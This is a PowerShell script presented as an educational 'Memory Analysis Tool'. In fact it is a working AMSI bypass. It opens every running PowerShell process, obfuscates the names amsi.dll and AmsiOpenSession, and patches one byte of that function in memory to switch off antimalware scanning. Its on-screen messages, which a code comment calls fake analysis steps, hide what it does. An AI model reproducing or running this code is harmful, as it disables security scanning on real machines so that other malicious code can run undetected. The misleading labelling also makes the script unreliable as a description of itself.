# Memory Analysis Tool Banner
$banner = @'
 _   _      _ _
| | | |    | | |
| | | | ___| | | ___
| | | |/ _ \ | |/ _ \
\ \_/ /  __/ | /  __/
 \___/ \___|_|_|\___|
                     
                     
Memory Analysis Tool v1.0
Developed by Abhishek Sharma | Date: 10/08/24
For educational purposes only
'@

Write-Host $banner -ForegroundColor Green

# Prompt the user to begin analysis
$confirmation = Read-Host "Press Enter to start the memory analysis"

# Define a helper class for memory operations
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class MemoryHelper
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // Opens a handle to a process for memory operations
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // Writes data to process memory
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // Closes an open handle
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // Loads a module into the address space
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // Retrieves a function address from a module
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Modifies memory protection settings
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

# Function to analyze process memory
function AnalyzeProcessMemory {
    param (
        [int]$processId
    )

    Write-Host "Analyzing memory for process ID: $processId" -ForegroundColor Cyan

    $memoryByte = [byte]0xEB  # Byte for memory adjustment

    $objectAttributes = New-Object MemoryHelper+OBJECT_ATTRIBUTES
    $clientId = New-Object MemoryHelper+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [MemoryHelper]::NtOpenProcess([ref]$hHandle, [MemoryHelper]::PROCESS_VM_OPERATION -bor [MemoryHelper]::PROCESS_VM_READ -bor [MemoryHelper]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        Write-Host "Failed to open process handle. Status: $status" -ForegroundColor Red
        return
    }

    $moduleName = -join @('a', 'm', 's', 'i', '.', 'd', 'l', 'l')
    Write-Host "Loading module $moduleName..." -ForegroundColor Cyan
    $moduleHandle = [MemoryHelper]::LoadLibrary($moduleName)
    if ($moduleHandle -eq [IntPtr]::Zero) {
        Write-Host "Failed to load module." -ForegroundColor Red
        [MemoryHelper]::NtClose($hHandle)
        return
    }

    $functionName = -join @('A', 'm', 's', 'i', 'O', 'p', 'e', 'n', 'S', 'e', 's', 's', 'i', 'o', 'n')
    Write-Host "Locating function $functionName..." -ForegroundColor Cyan
    $functionAddr = [MemoryHelper]::GetProcAddress($moduleHandle, $functionName)
    if ($functionAddr -eq [IntPtr]::Zero) {
        Write-Host "Failed to locate function in module." -ForegroundColor Red
        [MemoryHelper]::NtClose($hHandle)
        return
    }

    $targetAddress = [IntPtr]($functionAddr.ToInt64() + 3)
    Write-Host "Adjusting memory protection at address $targetAddress..." -ForegroundColor Cyan
    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)
    $protectStatus = [MemoryHelper]::VirtualProtectEx($hHandle, $targetAddress, $size, [MemoryHelper]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        Write-Host "Failed to adjust memory protection." -ForegroundColor Red
        [MemoryHelper]::NtClose($hHandle)
        return
    }

    Write-Host "Writing to memory at address $targetAddress..." -ForegroundColor Cyan
    $bytesWritten = [System.UInt32]0
    $status = [MemoryHelper]::NtWriteVirtualMemory($hHandle, $targetAddress, [byte[]]@($memoryByte), 1, [ref]$bytesWritten)

    if ($status -eq 0) {
        Write-Host "Memory analysis completed successfully at address $targetAddress." -ForegroundColor Green
    } else {
        Write-Host "Failed to write to memory. Status: $status" -ForegroundColor Red
    }

    Write-Host "Restoring memory protection..." -ForegroundColor Cyan
    $restoreStatus = [MemoryHelper]::VirtualProtectEx($hHandle, $targetAddress, $size, $oldProtect, [ref]$oldProtect)

    if (-not $restoreStatus) {
        Write-Host "Failed to restore memory protection." -ForegroundColor Red
    }

    Write-Host "Closing process handle." -ForegroundColor Cyan
    [MemoryHelper]::NtClose($hHandle)
}

# Function to analyze all PowerShell processes
function AnalyzeAllProcesses {
    Write-Host "Scanning PowerShell processes..." -ForegroundColor Cyan
    $processes = Get-Process | Where-Object { $_.ProcessName -eq "powershell" }
    foreach ($proc in $processes) {
        Write-Host "Processing ID $($proc.Id)" -ForegroundColor Cyan
        AnalyzeProcessMemory -processId $proc.Id
    }
}

# Main execution with fake analysis steps
Write-Host "Initializing memory analysis..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "Scanning system processes..." -ForegroundColor Cyan
$allProcesses = Get-Process
Write-Host "Found $($allProcesses.Count) processes." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "Analyzing PowerShell instances..." -ForegroundColor Cyan
AnalyzeAllProcesses
Write-Host "Memory analysis completed." -ForegroundColor Green